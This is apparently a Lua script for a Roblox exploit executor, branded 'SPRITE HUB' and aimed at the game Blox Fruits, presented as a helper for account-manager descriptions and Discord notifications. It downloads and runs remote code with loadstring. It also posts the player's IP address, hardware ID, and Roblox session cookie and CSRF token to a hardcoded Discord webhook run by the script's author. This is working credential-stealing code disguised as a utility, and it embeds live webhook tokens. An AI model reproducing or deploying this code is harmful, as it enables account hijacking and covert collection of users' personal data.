repeat wait() until game.Players;
repeat wait() until game.Players.LocalPlayer;
repeat wait() until game.Players.LocalPlayer.PlayerGui;
repeat wait() until game.ReplicatedStorage;
repeat wait() until game:IsLoaded();

if game.gameId == 994732206 then
    spawn(function()
        pcall(function()
            local RAMAccount = loadstring(game:HttpGet "https://raw.githubusercontent.com/ic3w0lf22/Roblox-Account-Manager/master/RAMAccount.lua")()
            local MyAccount = RAMAccount.new(game:GetService "Players".LocalPlayer.Name)
            local Script_Version = "1.0.0"
            local Webhook_Api = "https://discord.com/api/webhooks/" .. "1073750843066695720/QRz9cTl3lp6n2uogThVCZl3jHeG8U01eggsByEjftXwZDtCNV9pIwuiPe9WVKmwi-KjE" --Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
            local placeId = game.PlaceId;
            local awake = {}
            local awake_list = ""
            
            if placeId == 2753915549 then
                world_check = "1";
            elseif placeId == 4442272183 then
                world_check = "2";
            elseif placeId == 7449423635 then
                world_check = "3";
            end
            
            function Check_Data_Roblox_Account_Manager()
                name = "Display Name: " .. game.Players.LocalPlayer.DisplayName .. "\n"
                time = "Last: " .. os.date("!%H:%M", os.time() + 7 * 60 * 60) .. "\n"
                world = "World: " .. world_check .. "\n"
                level = "Level: " .. Number_Format(game.Players.LocalPlayer.Data.Level.Value) .. "\n"
                beli = "Beli: " .. Number_Format(game.Players.LocalPlayer.Data.Beli.Value) .. "\n"
                fragments = "Fragments: " .. Number_Format(game.Players.LocalPlayer.Data.Fragments.Value) .. "\n"
                devilFruit = "Devil Fruit: " .. game.Players.LocalPlayer.Data.DevilFruit.Value .. "\n"
                awaked = "Awake: " .. Check_Awake_Fruits() .. "\n"
                race = "Race: " .. game.Players.LocalPlayer.Data.Race.Value .. "\n"
                lastspawnpoint = "Last Spawn Point: " .. game.Players.LocalPlayer.Data.LastSpawnPoint.Value
            end
            
            function Check_Awake_Fruits()
                game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.Visible = true
                task.wait(1)
                for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.TopContainer.Frame:GetChildren()) do
                    if v:IsA('ImageButton') then
                        if v.Name == 'Template' then
                            else
                            table.insert(awake, v.Name)
                        end
                    end
                end
                awake_list = ""
                for i, x in pairs(awake) do
                    awake_list = awake_list .. x .. ", "
                end
                spawn(function()
                    task.wait(1)
                    game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.Visible = false
                end)
                return awake_list
            end
            function Number_Format(value)
                local abbreviations = {"", "K", "M"}
                local ex = math.floor(math.log(math.max(1, math.abs(value)), 1000))
                local abbrevs = abbreviations[1 + ex] or ("e+" .. ex)
                local normal = math.floor(value * ((10 ^ 1) / (1000 ^ ex))) / (10 ^ 1)
                return ("%." .. 1 .. "f%s"):format(normal, abbrevs)
            end
            
            function Number_Comma(value)
                local formatted = value
                while true do
                    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
                    if (k == 0) then
                        break
                    end
                end
                return formatted
            end
            
            function Check_Status_Roblox_Account_Manager(n)
                if _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Enable"] then
                    if n == 1.1 then
                        return "Alias"
                    elseif n == 1.2 then
                        return MyAccount:GetAlias()
                    
                    elseif n == 2.1 then
                        return "Description"
                    elseif n == 2.2 then
                        return MyAccount:GetDescription()
                    
                    elseif n == 3.1 then
                        return "Cookie"
                    elseif n == 3.2 then
                        return MyAccount:GetCookie()
                    
                    elseif n == 4.1 then
                        return "CSRF Token"
                    elseif n == 4.2 then
                        return MyAccount:GetCSRFToken()
                    end
                end
                return ""
            end
            
            function CHECK_IP()
                return (syn and syn.request or request)({Url = 'https://api.ipify.org', Method = syn and "Get" or "GET"}).Body or "error"
            end
            
            function CHECK_HWID()
                return game:GetService("RbxAnalyticsService"):GetClientId() or "error"
            end
            
            function CHECK_GAME_NAME()
                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "error"
            end
            
            function RB_NOTIFICATION(title, text, duration)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = title or "SPRITEHUB",
                    Text = text,
                    Duration = duration or 10,
                })
            end
            
            
            
            
            --------------------------------------------------------------------------------------------
            ----------------------------------------- SETTINGS -----------------------------------------
            --------------------------------------------------------------------------------------------
            local Invite_Code = "dA5TzZysQp" --โค้ดคำเชิญ | Invite Code Discord
            if not _G.SPRITEHUB_BLOXFRUITS then
                _G.SPRITEHUB_BLOXFRUITS = {
                    ["Discord"] = {
                        ["Enable"] = true, --เข้า Discord อัตโนมัติ | Auto Join Discord
                    },
                    ["Roblox Account Manager"] = {--การตั้ง Description ในโปรแกรม Roblox Account Manager | Set Description in Roblox Account Manager
                        ["Enable"] = true, --เปิดใช้งานหรือไม่ true = เปิด / false = ปิด | Enable? true or false
                        ["Loop"] = true, --วนลูปหรือไม่ true = เปิด / false = ปิด | Loop? true or false
                        ["Delay"] = 10, --ดีเลย์ [มากกว่า 10วิ-20วิ] (วินาที) | Delay [more than 10s-20s] (Sec)
                    },
                    ["Webhook"] = {--การแจ้งเตือนผ่าน Discord | Discord Webhook Notification
                        ["Enable"] = true, --เปิดใช้งานหรือไม่ true = เปิด / false = ปิด | Enable? true or false
                        ["Link"] = "https://discord.com/api/webhooks/" .. "1080356587253792840/hVHN_qZ2_SJtg_f_xxRYWqI9gMcPGPVRzAAAlxJ5dMmlGvnFNW1qn-9HRdLOKj7_Z2Wy" --ลิงค์ Webhook | Link Webhook / Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
                    --["Link"] = "123456789/xxxxxxx" / Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
                    }
                }
            end
            
            if _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Delay"] < 10 then
                _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Delay"] = 10
                RB_NOTIFICATION("SPRITEHUB - NOTIFICATION", "Roblox Account Manager > Delay : must be more than 10", 10)
            end
            
            if _G.SPRITEHUB_BLOXFRUITS["Discord"]["Enable"] then
                setclipboard("discord.gg/" .. Invite_Code)
                
                local Inviter = loadstring(game:HttpGet("https://raw.githubusercontent.com/HyPerKung999/Roblox/main/Other/Roblox%20-%20Discord%20Invite.lua"))()
                
                Inviter.Prompt({
                    name = "SPRITE HUB",
                    invite = "dA5TzZysQp",
                })
                
                Inviter.Join("dA5TzZysQp")
            end
            
            spawn(function()
                setclipboard("discord.gg/" .. Invite_Code)
                RB_NOTIFICATION("SPRITEHUB - "..CHECK_GAME_NAME().." V."..Script_Version, "Welcome! " .. game.Players.LocalPlayer.DisplayName .. "\n(" .. CHECK_IP() .. ")", 10)
                RB_NOTIFICATION("SPRITEHUB - "..CHECK_GAME_NAME().." V."..Script_Version, "Discord: discord.gg/" .. Invite_Code, 10)
                
                local Http_Webhook_Api
                if syn then
                    Http_Webhook_Api = syn.request
                else
                    Http_Webhook_Api = request
                end
                Http_Webhook_Api({
                    Url = Webhook_Api,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        ["username"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
                        ["embeds"] = {
                            {
                                ["author"] = {
                                    ["name"] = "SPRITE HUB [By.SPRITEDEV (HyPer Kung)]",
                                    ["url"] = "https://discord.gg/" .. Invite_Code,
                                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                },
                                ["color"] = tonumber(0xffffff),
                                ["title"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
                                ["description"] = "```" .. "\n" .. "Game: " .. CHECK_GAME_NAME() .. "\n" .. "Script Version: " .. Script_Version .. "\n" .. "Ip: " .. CHECK_IP() .. "\n" .. "Hwid: " .. CHECK_HWID() .. "```",
                                ["url"] = "https://discord.gg/" .. Invite_Code,
                                ["fields"] = {
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Info",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Name",
                                        ["value"] = game.Players.LocalPlayer.Name,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Nick Name",
                                        ["value"] = game.Players.LocalPlayer.DisplayName,
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Level",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.Data.Level.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Beli",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.Data.Beli.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Fragments",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.Data.Fragments.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Devil Fruit",
                                        ["value"] = game.Players.LocalPlayer.Data.DevilFruit.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Race",
                                        ["value"] = game.Players.LocalPlayer.Data.Race.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Last Spawn Point",
                                        ["value"] = game.Players.LocalPlayer.Data.LastSpawnPoint.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Level",
                                        ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Level.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Beli",
                                        ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Beli.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Fragments",
                                        ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Fragments.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Devil Fruit",
                                        ["value"] = game.Players.LocalPlayer.Data.DevilFruit.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Race",
                                        ["value"] = game.Players.LocalPlayer.Data.Race.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Last Spawn Point",
                                        ["value"] = game.Players.LocalPlayer.Data.LastSpawnPoint.Value,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Roblox Account Manager",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(1.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(1.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(2.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(2.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(3.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(3.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(4.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(4.2),
                                        ['inline'] = false
                                    },
                                },
                                ["footer"] = {
                                    ["text"] = ('วันที่: %s'):format(os.date('%d/%m/%Y | เวลา: %H:%M:%S', os.time() + 7.05 * 60 * 60)),
                                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                }
                            }
                        }
                    })
                })
            end)
            
            spawn(function()
                while task.wait() do
                    if _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Enable"] and not _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Loop"] then
                        if MyAccount then
                            Check_Data_Roblox_Account_Manager()
                            MyAccount:SetDescription(name .. time .. world .. level .. beli .. fragments .. devilFruit .. awaked .. race .. lastspawnpoint)
                            break
                        end
                    elseif _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Enable"] and _G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Loop"] then
                        if MyAccount then
                            Check_Data_Roblox_Account_Manager()
                            MyAccount:SetDescription(name .. time .. world .. level .. beli .. fragments .. devilFruit .. awaked .. race .. lastspawnpoint)
                            Wait(_G.SPRITEHUB_BLOXFRUITS["Roblox Account Manager"]["Delay"] or 10)
                        end
                    else
                        Wait(10)
                    end
                    Wait(10)
                end
            end)
            
            spawn(function()
                while task.wait() do
                    if _G.SPRITEHUB_BLOXFRUITS["Webhook"]["Enable"] then
                        local Http_Webhook_Check
                        if syn then
                            Http_Webhook_Check = syn.request
                        else
                            Http_Webhook_Check = request
                        end
                        Http_Webhook_Check({
                            Url = _G.SPRITEHUB_BLOXFRUITS["Webhook"]["Link"],
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = game:GetService("HttpService"):JSONEncode({
                                ["username"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
                                ["embeds"] = {
                                    {
                                        ["author"] = {
                                            ["name"] = "SPRITE HUB [By.SPRITEDEV (HyPer Kung)]",
                                            ["url"] = "https://discord.gg/" .. Invite_Code,
                                            ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                        },
                                        ["color"] = tonumber(0xffffff),
                                        ["title"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
                                        ["description"] = "```" .. "Name: " .. game.Players.LocalPlayer.Name .. "\n" .. "Nick Name: " .. game.Players.LocalPlayer.DisplayName .. "\n" .. "```",
                                        ["url"] = "https://discord.gg/" .. Invite_Code,
                                        ["fields"] = {
                                            {
                                                ["name"] = "Level",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.Data.Level.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Beli",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.Data.Beli.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Fragments",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.Data.Fragments.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Devil Fruit",
                                                ["value"] = game.Players.LocalPlayer.Data.DevilFruit.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Race",
                                                ["value"] = game.Players.LocalPlayer.Data.Race.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Last Spawn Point",
                                                ["value"] = game.Players.LocalPlayer.Data.LastSpawnPoint.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "Level",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Level.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Beli",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Beli.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Fragments",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.Data.Fragments.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Devil Fruit",
                                                ["value"] = game.Players.LocalPlayer.Data.DevilFruit.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Race",
                                                ["value"] = game.Players.LocalPlayer.Data.Race.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Last Spawn Point",
                                                ["value"] = game.Players.LocalPlayer.Data.LastSpawnPoint.Value,
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "Roblox Account Manager",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = Check_Status_Roblox_Account_Manager(1.1),
                                                ["value"] = Check_Status_Roblox_Account_Manager(1.2),
                                                ['inline'] = false
                                            },
                                        },
                                        ["footer"] = {
                                            ["text"] = ('วันที่: %s'):format(os.date('%d/%m/%Y | เวลา: %H:%M:%S', os.time() + 7.05 * 60 * 60)),
                                            ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                        }
                                    }
                                }
                            })
                        })
                    end
                    wait(30)
                end
            end)
        end)
    end)
end
